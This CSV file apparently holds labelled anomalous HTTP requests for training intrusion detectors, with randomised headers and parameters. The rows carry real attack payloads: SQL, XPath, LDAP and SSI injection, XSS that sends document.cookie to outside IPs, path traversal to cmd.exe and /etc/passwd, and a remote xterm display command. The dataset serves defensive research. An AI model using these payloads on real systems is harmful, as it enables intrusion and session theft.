"Class","Method","URI","Host-Header","Host","Connection","Accept","Accept-Charset","Accept-Language","Cache-control","Cookie","Pragma","User-Agent","Content-Length","Content-Type","POST-Data","GET-Query"
"Anomalous","GET","/ilsyo6iyhmnioaoo/3veCfi9io.htm","HTTP/1.1","www.cnidj0.it:7200","close","application/postscript, image/*","x-mac-hebrew, euc-tw, x-mac-hebrew;q=0.6","*;q=0.9","max-stale=4","nrutcnnUr=2;YJUn0ROQxmlA_O=t","tWh12sdl='ecsaatl'","Mozilla/3.9 (compatible; iPryrene; Linux i586; vshed8et; mcvKn; asInbo3S)","","","","oiatItttEeoo=n0e&3vUndtah=8igrfompo&rpuwoekTihi=chairs%27++UN%2F**%2FION++SEL%2F**%2FECT+++3tnfywt+++++FROM+dba_users++++WHERE++EtAou++like+++++%27%2525&sColaytl=7hner&t2oliiOleha=Bo&Qqoi=enhvme2Tia&h5mss=s+&ttharaydst0eiap=Ell"
"Anomalous","GET","/cpT/stPiMrKrmp08@qRlP/apWlDi/oAeuidr/dEnr.js","HTTP/1.0","www.bei1jcfm.uk","keep-alive","*/*","iso-2022-jp;q=0.1, iso-8859-4, macintosh, windows-1250, windows-874;q=0.5","rnE-st, ss-w;q=0.9","max-stale=150","nsystemZab=nR5y","no-cache","Mozilla/9.9 (Machintosh; U; PPC Mac OS X 7.7; sl-cb; rv:6.0.5) Gecko/10436651","","","","nertihackm4s=LnEe%27++++or+++%28i++%3C+count%282eswce%2Fchild%3A%3Atext%28%29%29+and+j+++++%3C+++count%28s1cAe%2Fchild%3A%3Acomment%28%29%29++++and++++k+++++%3C++++count%28eett3%2Fchild%3A%3A*%29+%29+++or+++%27brmoett%27%3D++++%27+++++upocv%27+++or"
"Anomalous","GET","/sZzomxR/d@gg/xE-GVSqVqNoq2St4i0/alnmu8HatesealobstAr/cIrsesr6orvc/zf4BMzK8hupdate07/dm5imk3cstthMtnenmfs/IrHirsnthtIh.pl","HTTP/1.1","216.89.148.185","close","audio/x-wav","*","4N-sel","only-if-cached","ugnpd=21;0log..k2=oeaua;smdaI=o<aiille%insert","knN9mase=is","Mozilla/1.2 (X11; U; Open BSD i386 1.8; nr-Rc; rv:5.1.1) Gecko/77640294","","","","etlbeoekIea3=749766&x_G84mtCFWU1=5&JdnmekyEld=cnL1Dd5&eUalztghrwonda=1802&te=rTesDou3h1Efsf4vro&K3Tvs=r%40MTVLnx&c9F@0AlCLA9=3c1&h5oyhhetzhE=fte42Hheh2TbE5i&jTEW1winntE6=lXADk&Leiogst=dra+ema+Wejle+e%27&f-pskM14body=ef&Rlfsyessoju0=br0vbscriptsnph-ea3n&2cepsl24aDs=eitop&2ljhihey3saitni=85&dqeeyah=%26%3Cscript++++%3E%5Balert+%28%27ocrerU2%27%29%3B%5D%3C%2Fscript%3E"
"Anomalous","GET","/oozscfeyrmsrEenfb/qYcehG9k4d/iqFIvsnIiWpT-uJOi/7x/ftV/wbodyem2piyBlogD/cIKaw5coK.shtml","HTTP/1.1","www.lkAsnnsl.com","fidrtee","video/quicktime","*","iri4-gi;q=0.8, zge-ieil;q=0.5","max-stale","dLDa=ussntmstyleo;33gg@-aOcwYexec=erxgM.xnN;e4irioaAi=012643;rei4=og0eHmieieswp-G;0yeta=S7foNgcie9qyaqmHe","no-cache","Mozilla/7.7 (X11; U; Open BSD i386 0.5; hH-me; rv:1.8.3) Gecko/34809408","","","","mteeohhahottuz=%3Cimg+++src++%3D+++%22+++icme+++++%22onmouseover++++%3D+++%22+++%5Bwindow.open%28%27http%3A%2F%2F20.13.177.51%2Fisro.asp%27%2Bdocument.cookie%29%3B%5D+%22+%3E"
"Anomalous","PUT","/eqgb/bp/sXqNttZVdIgJ4Lcd2q0q/_Bv2TXQPvnf/Na.php4","HTTP/1.1","www.UIul8zkit.com","close","*/*","hz-gb-2312","9AnTAD-rTe;q=0.3","min-fresh=6","nnoded67KSMHy=/etc/passwd","","Mozilla/1.5 (Machintosh; U; Mac OS X 6.8; us-ea; rv:4.8.0) Gecko/75791530","26","application/x-www-form-urlencoded","0thaeuyt1=caccess_logrsnRd",""
"Anomalous","GET","/lOSf/eEGU/AOcnnheilsf/cugvGRa3/8o6naOos3r4/eyi2e/oIA/inawt2eru/oorxeohr/bessmog4Eein8o/seraidrrta.mdb","HTTP/1.1","www.e4eth.uk:80","keep-alive","*/*;q=0.1","windows-1250;q=0.2, x-mac-japanese;q=0.5, x-mac-ce;q=0.8, x-mac-arabic;q=0.8, windows-1254;q=0.2","aw-c","no-transform","of","no-cache","Mozilla/2.8 (Windows; U; Win 9x 5.7; lr-Ee; rv:8.6.9) Gecko/26197396","","","","rlsl6enn8bpi=nioatoaa&alkeedepqs=y4anycas%27++++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or+++++%279gbnsnUs%27+++%3D++++%27&tym=878863921&b8z3NgeH=wgetote&a6eennmFocixad=511758879&1wh1=et%26Twe%40y0%7CT&renl=rrz&tnseraafosraAnf=detileusaa8gbiosec%2Fg&xGC2dMre5K=25602511"
"Anomalous","GET","/y9f/threjoqahsi/7x8Az.png","HTTP/1.1","197.42.106.189","keep-alive","image/jpeg, text/html;q=0.2","windows-1255;q=0.1, iso-10646-ucs-2, euc-tw, us-ascii, iso-8859-2","odxnaiIr-s0ieel;q=0.8, jozkba-er, nOaetku-th","no-cache","2wEfRdaus9arjhe=ijmh3ec;ertntuQoEhy=aDtn nOpimg nUwO3anq<","3krf='eTo'","me-jua http://www.am6egu.it","","","","yHkxf2emrxklee=wawerlaobgsoundsp+s3e&wheremgO8U=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&Vvbshoi6aiaDn1=Dt6U&teIt9iGraehs=oxZp%40e7Ot"
"Anomalous","GET","/..%u00255c..%u00255cwinnt/system32/cmd.exe","HTTP/1.1","239.241.158.63","keep-alive","*/*","x-mac-ce;q=0.4, x-mac-chinesetrad, cp-932, x-mac-hebrew, windows-874","lh-baen;q=0.4","no-cache","do=50804;iweyerclfmdooj=3095","haw3tnnu='g8e6wutu'","Mozilla/5.7 (Machintosh; U; Mac OS X 7.1; ns-sc; rv:5.7.2) Gecko/81639056","","","","/c+dir"
"Anomalous","GET","/o2cPVXAa6include/dpWEh7n8zh@T.jpeg","HTTP/1.0","22.164.94.17:110","close","audio/*;q=0.9","*","*","min-fresh=67766","tieoP=97051;mxbR.s7=eeqm6e;ZexecfKFaWRVobjectTb=2xwuoscriptHeaamrhte;Ysamiwigphp8QEc=ncwrtaarristt","no-cache","Mozilla/9.2 (Windows; U; WinNT 2.8; 3H-ln; rv:6.8.3) Gecko/86225207","","","","3SL=metaene%28lii9open&sgitNpsjbdu=iid9nrtisu&jha=%3Cbgsound+src++++%3D++++%22+javascript%3A%5Balert+++%28%27dbrogtf%27%29%3B%5D%22++%3E&hrGijAttdmieaoi=nrDEhns7abTnctplud&0awm=3ep"
"Anomalous","PUT","/njYa/earzm3eartbpteneCoz/Inarzr7t2/TdpgrsWwmboAm/oo1l7WAfjOQruLVe/0MRvaqtZKUsRda7/o7SalnesoietaOtsaAii/hSWjd44q6Ywy.GPtc.asmx","HTTP/1.1","74.187.114.14:80","5yseh","video/mpeg;q=0.0, application/*","utf-8;q=0.1, macintosh;q=0.0","*;q=0.8","max-age=6","seNgsuctstazet= 2 ;e9z=scriptsyav znf;cois=62593119;replaceccJlikeY=2107424111;lt=cQNElKBKr;ZyY8ya8GzRi=9","en6u=ri","rH.fr5d@K http://www.hnih.cz","133","application/x-www-form-urlencoded","YC5@KOSvI=657&p@ASIsQa=17&ycavrjesiw=hmsodpafohhba&fde=ndFB&OzMq_@Wplogr=e:\\winnt\\boot.ini&oLetlYiirts=8ypninputtlifromhg<Et",""
"Anomalous","GET","/hUQ1diNcNJnd@Ow/VqIvCTk/nQZYXnc.dh@_qSsHxk5N/a0dqBAtJwUfZvUBA/wKqNRud15bunionaS/7XBCFdBY_gus5by9.nsf","HTTP/1.1","www.Es8qi.net","rtte","*/*","isiri-3342, windows-1252;q=0.0, cp-936, windows-1255;q=0.6, iso-2022-kr;q=0.4","*;q=0.8","max-stale=1","oq7seNzswe=skd6b-xyGO;e2ewaoaOp=0","otoepa6='oEDisdE'","S2ilsroc (eeI5nLF)","","","","kxaA=so2i&tn=%3B+++++exec++++get_cust%28+%27x%27%27+union+select+++object_name%2Cobject_type%2C%27%27x%27%27+++from++++user_objects+++++where+++%27%27nM%27%27+%3D++++%27%27++++%27++++%29%3B&tiFptiaptqe=mRJaWs&irseen1zn3ue=6&IH1K5DNelsF9=3245595&oaln=eeAfimgteo"
"Anomalous","GET","/i4_UypK/pi/lPiu/tYCBkG0Tk_dzLbnq4rtH/IiuZ7W9V3/Ou/uVjna/IlikexrY8JT3.bin","HTTP/1.0","249.38.161.76","xee5M","image/gif;q=0.0","*","6d-mczv","min-fresh=712","acnti=e4Y32uwP._;XwGWU.L=rRZ6XQ0;ahbt5utrger=13;tascanopecn=uIXo","rhl0rs='t'","Mozilla/8.4 (Machintosh; U; PPC 1.4; Fe-aD; rv:2.2.4) Gecko/30629359","","","","yelo7ooR0=qjap7Vx6u&fnzilIsnwtte=%7CdI5+csitag1pu&ehaezjubya=asttnre&Xs0dkVetcNh1Qu=chairs%27+++UN%2F**%2FION++SEL%2F**%2FECT++++aS++++FROM+++++dba_users++WHERE+t1oed1tD+++like++++%27%2525&fcset=qed&wgsotbsnpoeIaa=1&FYGbodyDaNPXeybgsound=r7_%40&YCdeleteD=t%3Ab&hslcdf=2182421&3l9yvektet=unionranl&SLuaVD=3e7dtnas+o%286&Ifm9uOj8NXinclude7=mt%28&whgteivlHieia=67212&sHX07includeb=rrns%40s&rHZige2vtnp6Ohk=72571"
"Anomalous","GET","/cG/-6r2Vreplace4Xqw/TrrbeoesFHdaTtft/5document-Pggp643/tc.BPxKM1Gt_63l4zA/h@GLtDlvmq0BW8X7/tonksnqButlWVZB/npi/mSnh/sN5ol.tiff","HTTP/1.1","www.hmNs6ny.st:80","close","*/*","*;q=0.8","*;q=0.0","min-fresh=06201","eviYuylr5=054236;omiiee9dvn=sCxe","94o8dm='fn'","eM4mj0P4nV http://www.neh6thdn.be","","","","hnagijtcescoe0=tsn3eauesHtu&Mw-JpsevaljXJ=uvg7iomhdiyleon7c5&ahh2c=alNptnsolSeeoE4t&ap0wis=Ytp4&ecae=8l%29%28%26%28objectClass+%3D++o4TS*%29&4yh40awnr1o3eh=28743&yaq=totet&fl9tsyWDnturee=3%25uinovt2do&y3wrimfcnt9sm=isreplacer2l%3Adm2nbgsound"
"Anomalous","GET","/polyiefn/2UKNvRStpQMP/3L8_gz9x/u9Lavobvw0/aY8sV7j5-bXqbfGtWEQ/n8Oh/merte3eohe.jpeg","HTTP/1.1","140.241.33.6","uiTao","audio/basic","*","don-fhg","x=eThme","69Xl=o4zldb0Bbq;tlxg=2sl2aN;eee4baemsoi=ibZXVXx46","no-cache","Mozilla/6.1 (compatible; Konqueror/3.4; Windows NT; xaeiEiwht)","","","","neeaemnt=like+U&ctiauEqr=raStztlsek1d&teSsgc9wu=garrsvuUcodse&xdartveOep=%3Cstyle+%3E%3C%21--%3C%2Fstyle++%3E%3Cscript%3E%5Bwindow.open%28%27http%3A%2F%2F214.40.221.80%2Fandeti.msf%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript++%3E"
"Anomalous","GET","/gogiinEocqhbj/alhLkbS8ygCq@I-4fCNV.php","HTTP/1.1","www.wTaeEshi.org","ssgcpta","text/*;q=0.2, video/quicktime;q=0.2","shift_jis;q=0.6, iso-8859-1, iso-8859-2, iso-8859-9","4xspalee-5;q=0.0, F-tp","no-cache","homeiNimg_rcp-_=lnsedmf1Eunrs;WG-JGFA=asock_streamn;Telboaer=eRVm5byi;te88nikrctc2tiH=79;sa4mj3=urlo;oElop4v=rxZX0oyvDF","no-cache","Mozilla/4.4 (Machintosh; U; PPC Mac OS X 3.7; 8n-vb; rv:6.8.9) Gecko/45994958","","","","XsoTnuheIe2Ge=%3C%21--++++%23odbc+++++statement%3D++++%22select+gdi%2C++++tra%2C+++nfieuiao++++from++++m1Pbs3os++order+++++by++++9%2C++++24%2C+++++0%22++--%3E&pa=ewl&astdeneciaoi=tkhbG&fsciwQO=q53Grz8"
"Anomalous","GET","/n7.JCAK.asp","HTTP/1.1","114.45.232.255","close","*/*;q=0.2","*","*;q=0.8","min-fresh=80040","eskomttweuhI=uC4BsjW;pezuretB0=rAs httpshg6  PslrbQ%","i30cor=aaP5NEe","Mozilla/7.6 (compatible; tlt4i5snh; Open BSD i386; srteY)","","","","JC5t2ps2=whn&dKOlpassthruxhttpzr7HO=464403698&ugtaoeenyaiwTon=683&5EGMKS7inFcYw=ElypositionheinFrotirtmocha&tsdNapalibunHq=nxd0h&passwdL_BKIupdateh=IdTtohtue&oD49j4heoiocet=avsne&uitlobxxfultt7s=mm8kwRDHua&te6Eqea=%250A+++++xterm+++++-display+++++www.sees.com%3A0.0++++&l5aqaStoe=rQlb&osesgtgTiltemax=22931&oeelcyaiOo=n6WhJKsNAVM&eSan=u0c&PQuBtmpid=4278&hlehITscIe=Jh%7E%3A"
"Anomalous","GET","/av5xs/iKgM0Y0QNmf/crtceeo/ha/04/s8/ai4pCF1zwaWJe-/pt7V/hNt/ut/a1jRX_h5..6qdaBXvp/on9t8n.mdb","HTTP/1.0","43.98.31.133:788","close","*/*","cp-932;q=0.1, macintosh;q=0.5, isiri-3342","*;q=0.0","no-transform","BAbotorI=sQ0-c2aI8;lasakteprgsws=tgfprocessing-instruction4nwhtsi9fj;ywzexh1ot5oo7=34","lremsDh=xZa","ecLIujTH http://www.xmuira.uk","","","","hnctun9uAodrya=t%27Vtnotewe%5CC&toc6bQ=44850400&60nans=51997&oan=%27+++++OR+%27srq6lbe%27+++%3D+++++N%27+++++&ihhgrdh6eFfrl=881&etrhTsfdree=34236&lrtnqeue4=Ep4a8he&aonB=6%29+%3Do&nuai=E9e&U0sr0emirtr9f=8562&Nknbgeooyuibi=16&rTlvtinismthm=71299054&9kHKn7bErgroup byNL=078735"
"Anomalous","GET","/irQyAO/2ninsnoatertgnzE0gan/oM/mtDy3V_h1Oy.png","HTTP/1.1","74.69.140.43","duso","audio/*, text/*;q=0.5, video/*","*;q=0.9","s-kt, trtvu-sbnbc;q=0.8, iloen-oh;q=0.4","only-if-cached","eomDgcyU4tyons=sduaxuHC26;rr6ne=hRi_1W;tbkcatnIw=e:m0 4My;a2wwbe=161970;ElsIimEakgu=u:iSscript;eywuaRcbhg=s<na05i","toys='srmoNJco'","ekl8Hkb9t","","","","nlepooAu=doc%28+++file%3A%2F%2F%2Fc%3A%2Fqu8u%2Fiilte.xml+++%29"
"Anomalous","GET","/jNg/tlypu643XmHpTyAMiH3/tZQs17wftTqQc7U/iu8/ift7/8X@T5RbinexecwWQ9@s/6OlHGX.swf","HTTP/1.0","www.tiaseul.fr","close","video/*, text/plain;q=0.9","*","esbseenr-ioehbat;q=0.8, 6thmeO-dfnenohe, E2n-Dtelm;q=0.8, doYbaolh-tet, str2ra6-bvO","min-fresh=897","LDaEFx=5371     or  yaxerc/oe/etoe/child::node()[position()=599]   or  378=;cjXZ-hX=tak;ug1Oexecm=wsar9gdS","pleorbe1=gl","Mozilla/2.8 (Windows; U; WinNT 1.3; vn-ee; rv:9.8.7) Gecko/10652530","","","","odoOsdrhm=5etE&eg9tjesqwOhEWwt=nr-cNG&1eosepsaqobnchi=eu5n0asneAejwGnt&rrgttootdaitc8e=3195350&stootaugt7=6307&atdt8=SCreilot+cn&wyohdeo69seo=0&ndel6btq5=vyetmoos"
"Anomalous","GET","/bRiJtR_AZ.asmx","HTTP/1.1","www.t0tl8.fr","keep-alive","image/png, audio/*;q=0.5","x-mac-ce, us-ascii;q=0.8, iso-2022-kr","*;q=0.6","es9=ttjneg8","aelbotc8w=859163962;MmyWsasrh=H6netuo3tswte","s=itinahE","Mozilla/4.2 (X11; U; Open BSD i586 2.1; gn-he; rv:5.2.3) Gecko/91120465","","","","toetoe5ottx=mALL4&emoeeol=OehOart3rincludel&Gphpincludec3Uoh4=41&slolnjiryqI=41133&gwyccrst=sn3slocation&p5Qe=6093&ieeE=6&dt9nlTmtuwols=etan+d5lcDs%24&nconnectOdZ=gdaaydrT3b7ewdtIfe&PSDiotAlq=%3Cxml+++++id++%3D++++%22X+++++%22+%3E%3Ca++%3E%3Cb+%3E%26lt%3Bscript++++%3E%5Balert++++%28%2753i2y%27%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb+++%3E%3C%2Fa++++%3E%3C%2Fxml++%3E&j4tnemwlneznp=ode&oaIeoua2hy2r072=2ltdez0&xot6hzelli=aEee1ret&wpamL1y2t=iqFsBRaQ2U&itanLN3j=iUh.fHYW4Y"
"Anomalous","GET","/rEygOY7@nt2zzcMU8eVK/kT57XBS./tDZCwYHiYacMv/lIsomsn/ixxFeVyEdjPwFtple/RTobjrmapnedm/4NjYCMnjHp0XHI/Za/DKfZAU4XvqBP6IA/tgPfHy/riN/N.A8group byIHMU-O.jpg","HTTP/1.1","122.43.55.15","cDssrGhi","text/*, image/gif;q=0.0","*;q=0.2","*","max-age=1","ghysawinmg=7;roC2om-7mBn.=6xGUa;illHaiduyhyamat=t?ri;ok5ro1t7esGv=8nE;a0yAd=hbij0e0ew7Oe7rsiap","i=ecochrgl","hLawl4lgnech","","","","ANrxoH68=1041&uus=wr9oa%29%28%7C+%28aatrd%3D*%29"
"Anomalous","GET","/file.bat/..","HTTP/1.0","135.95.13.237","close","text/*, image/gif;q=0.7, application/*","cp-950;q=0.8","*","max-age=43599","httpsDan=t","aastt='ryrw'","Mozilla/9.2 (compatible; Konqueror/2.1; Windows NT; nsahsm; ehfAe9rne1)","","","",""
"Anomalous","GET","/<SCRIPT>alert(document>URL)</SCRIPT>/","HTTP/1.0","www.bidoaEse.com","keep-alive","audio/basic;q=0.3, application/zip;q=0.7, text/*;q=0.7","windows-874;q=0.3","*","max-age=43417","at4a=93;0-esystem-vkincludeC=239;h3uneiOrir=H-%","ofewdi5e='hceanw'","Mozilla/5.5 (Machintosh; U; Mac OS X 4.4; ic-ce; rv:9.4.1) Gecko/49306650","","","",""
"Anomalous","GET","/aJNSQynKZ/4XelqH3Wadmin/tFU@7LfuVV25KZ@aFiPl/hIeTV.mspx","HTTP/1.0","225.55.150.116","close","*/*;q=0.2","*","9wX0p-g, TOlGti8-7ns8de4f","ias0fi='h4'","sa=rsree9stnDsEeedfI;ilX=4","IEonpgr='Sico'","aeonatesO (ozQGwA8_P5; 9q2s8E)","","","","os=14++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or++++00539%3D&mtshrAT8awAkse=776155&eaf=70850489&esmgaisgno6Wsrc=4152172855&nelacl1Es0E=twyhreeroEn"
"Anomalous","GET","/d6z1J3ZSMiVgVsL-Ck5I.php4","HTTP/1.0","www.enIaitqai.net:80","close","*/*;q=0.3","*;q=0.3","95Dortst-eoasuTj;q=0.6","no-transform","yi1liqelnerqs=h;_YX1=6nIY;r5=cvvneryycxivarallo","neshaEiN=ss","Mozilla/9.5 (compatible; Konqueror/1.8; Open BSD i386; dvc2e2Eh; axat5tD)","","","","eshN3iAauen2y=48clnhdaclcuEb&QcbetweenckLRsUM=%3C%21--+%23odbc+++++connect%3D%22Axk%2Clre8%2CypaeT%22++++statement%3D%22select+++++*+++from++0w%22--%3E&dteotEnett=wZPK3%40qv"
"Anomalous","GET","/txPsn/aEh/5tvofoU/zV9vs/lz/f92vHNuEXRKO/qR.0dcCz/s6gz-hKtC4ZFE.oI/trXyJlXuj.gif","HTTP/1.0","www.gsf2.biz","keep-alive","video/*;q=0.1, text/html;q=0.3","*","*","no-transform","C6H0is=aLEiexectt/prLctmp;ve2mto=3a;tei3Y3mcms=t3etn0icpg;jc98odu=r0o-kt8nw8likeinnacE","hre=a8tkfii","ezdiAIohdS/2.9.7","","","","e5=aoo%29%28+%7C+%28hooi%3D*%29"
"Anomalous","GET","/w-TbIfGhxM.gif","HTTP/1.0","www.OAFoiiit.ch","close","text/xml;q=0.4, image/*, audio/*;q=0.9","*;q=0.2","lashdXu-trpe;q=0.2","no-transform","nxn=cbnp=Tbodyouyh1ib;szn5t=83403783","","Mozilla/6.6 (X11; U; Open BSD i386 7.1; te-ae; rv:0.2.8) Gecko/61484388","","","","nnodzkni=m7cazH&oo1=hdssidVetamr&d9enrckfifekcjh=67&ig=90795&mhaSofr=rqsr&ttste63a=3o&dNgkN7Q7no=05658&4exgDehunjy=75428875&nefea=%3C%21--+++%23odbc+++++connect%3D%22Goass%2Cnmehn%2Coh2%22++++statement%3D%22select+++*+++from+++++na%22--%3E&thrq1n1ov=an&izr8id=its8at2iteewDM&ino=7433352&na=edmCSBbzxVW&iRdr0lT3tEntu=5tonx6dd%28a&rmepirihaIi=ikUF"
"Anomalous","GET","/vrY5ysNRF/ztsnwndtees/Oaetyodsem0ado/gtodrnleLds/.C6r69LbgsoundEL6.asmx","HTTP/1.1","126.228.88.212","keep-alive","application/*, text/html;q=0.4, audio/*;q=0.5","windows-1257, windows-1255, windows-1252","AND    ascii(lower(substring((SELECT  TOP     1  bbgueo  FROM sysobject   WHERE     xtype   =    'U'),1,1))) >  111","max-age=6","lfu63Aemrchdy=rheT/;vbscriptU-EoNZ=ra;ntlslRHat=ceLateae0dudiv;e1tbio=1ci1hNdyre;gwyairTgEd6a=17;ioahgcN=320852","ocst81en='tbnPE'","OR  257=257","","","","3oc=gieceaoronOcb&orusr67.n2e9=896&qr=%26r&h_osj6h=9Uohe3xTTlElvb6spi&2gLtt8toIbimIbe=erawistppMtnmzeiMd&s4oadts=b%3Eohtmnneftpan&ryh0_Gmailj4=%7Eoot5noe&aHh=y&eeaeeS3gnl8=9175&vhac=sKnXZ&ntelJdS=ui+s+eexecbdmife+nnt%29%3C&n6=hLfJTUY.w1gP&aate6j=o3%40Hl6"
"Anomalous","GET","/b7Bn7jUXCe/5ZySf@o/TacgaeERnmiwbelZ/3SlUW3Q/iutjtu.bin","HTTP/1.1","125.255.224.242:80","close","image/jpeg;q=0.8","big5;q=0.9, utf-7, iso-8859-15, euc-tw;q=0.6","caI7-tanusdi;q=0.4","max-stale","atHhdoUme=Teieeamind;SorM=i;oe3otI9nMwi=105;58IGPxD5MsU=sbo;hmNslm=marr3he;rajtlsaosntaiAe=rE z","no-cache","Mozilla/4.3 (Machintosh; U; PPC 9.9; 3k-mp; rv:8.5.9) Gecko/67380052","","","","7tv=a6IZ8G.%40y4&Q4WwMd2=443567&sSDO=nitoae%2Fhj%2Fidng3%2Fchild%3A%3Anode%28%29%5B+++position%28%29%3D45%5D+++++%7C+++hmh%2Fr5yeFi%2FOc%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D2%5D+or+++%27o7%27++%3D+++%27&eOrxces480t=xdnarwniypsarw&edekgn3phi=rA%40&nl5b9tasaeuhe6=hl&on2nith9fn=tnbrmocha"
"Anomalous","GET","/sMPrS8negGe/ogereete8eeAcunuse/j5os6EHe57hnzhebbno/aiuzhquct0etnn.htm","HTTP/1.0","126.246.57.15","keep-alive","video/*;q=0.6, text/xml, video/*;q=0.5","x-mac-roman, macintosh;q=0.0, utf-7;q=0.8","*","max-stale","Kx5qtelnetHGD=dnte","u=hEWNAeo","Mozilla/4.4 (compatible; MSIE 2.6; Win 9x; mewI)","","","","ogatfq82neToOse=lYen+l+&dum3aec=E%27isboot.ini&flofcn=Miu%2Far%2Fee%2Fchild%3A%3Anode%28%29%5B++++position%28%29%3D759%5D+%7C+zoee%2F4%2FcnSTmu%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D376%5D++or+++++%2733Cioroh%27++%3D++%27&uraio=retv&aBxaiu=cx&dwiaeoqshpFo=u9ahhtmp&8yaH09H=pdsren&lxrljsdict2i=Aw&anoqnd6ih=lGbK6CLzO&5d7Fsrm=hTypaM4CPpO"
"Anomalous","POST","/enlits4se/tfetnds7h.html","HTTP/1.1","125.96.165.12:9531","nstxn","*/*;q=0.0","x-mac-korean, x-mac-japanese;q=0.4, windows-1258;q=0.9, x-mac-turkish, x-mac-korean;q=0.3","ttEbneer-Sgruge2a;q=0.0, l8ebeto-cluewNq, t-bf;q=0.4","max-stale","CQ06j2mi=/etc/passwd","iocc=wonnefs","Mozilla/8.3 (Machintosh; U; PPC 2.5; ut-t8; rv:5.2.5) Gecko/35158077","221","application/x-www-form-urlencoded","8QKlyPSn=292&rItlunieesal8i=teop&@KjX=lmetaf&odrat=elesgNtewegjeqoWri&Nmhttpse5vrcp=aua&ee9te=7qu2stnaih&Cn4ice6leknfd=975&szhttpsegroup byePAv=9&n84mnecnaplns1n=7EV1FvkQ&akTgatosrh=6q&4t3nuq2nTl=3YyU8OC.mi&eeeabinyts6=47",""
"Anomalous","GET","/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe","HTTP/1.1","www.inaaat.com","rdnepi","*/*","*","*;q=0.1","no-store","rkauwhsd=9449;havingNhavingt7TI3Blink_T=ueX-@Nvd1;PE55@_VrH=maam0hsojgawrs;unIo7hm5=eeehwhhHmso;Fprst=a%9;tjuiEopaHicngnr=s657IzisJ","l=t","Mozilla/5.8 (compatible; AudaeliOw; Unix; eke7)","","","","/c+dir"
"Anomalous","GET","/nloLni0ytb.aspx","HTTP/1.0","189.159.140.181","keep-alive","*/*","*;q=0.3","8osla-htub4;q=0.9, eNsYet-ef, oit8oTd-r0ahal;q=0.3, j9s-tcl;q=0.3","max-stale=7","intf=am.i_vv;aoinlyr4=55;brh=n\\3~;tgi=540155;nslr=t20D.oF","no-cache","Mozilla/0.2 (compatible; Konqueror/1.5; Win98; ltde)","","","","ajig0g=relabodyefrom%7Csaygwinnt&u4zi=%27+OR+++%27Reoew5w%27++++%3D+N%27+&ez66auel2=rxta&nnO=5916&m1KLAWAx.-=snan&czKih58asmeB=abt&dhYIX5=n&tfnTho8iio=639&tettrrdsLwaegdi=60021474&aesjrRdsnc=copyedCliuwgreco"
"Anomalous","POST","/.2/Letc/2v/ejraraneawhriao.htm","HTTP/1.1","129.172.198.35","keep-alive","text/xml","*","*;q=0.7","grzi=ahnna","5Vz-SR@=cthaaira9Ra;tu=3387;m0tAtqaazd=54731257;0nn31=re]eiair1","zsoao='l2b'","cba4c3edoeneEttmU","573","application/x-www-form-urlencoded","lfeSe=cmails0ireq&aausshs6las=@i7sw&et6urmp=63817326&smec7hnm2tlEt=oa4jlcer8xtutdcte&mqnedfqediaqd=ptrDFZMTF&ohewled=ebsnex;hea|aa&eak23tid=078901&aiieieyti8=jcroumieISCHteeeh&rvnony=753645880&tl3letHrtwre4rn=uhTivoqo9obaotet&Nhnh5Gl4tygn=tihy&m3ntgs9sllftam=aus'     or     count( path/child::node()[position()=((  i   + j   +    k   +  l   +   1)]    |     path/child::*()[position()=(k+1)])=1 or     '3s' =    '  ot31'   or&6i4hFD=57&wevim=56&UfXEynA=allOeui|'union 2abetweentmpye",""
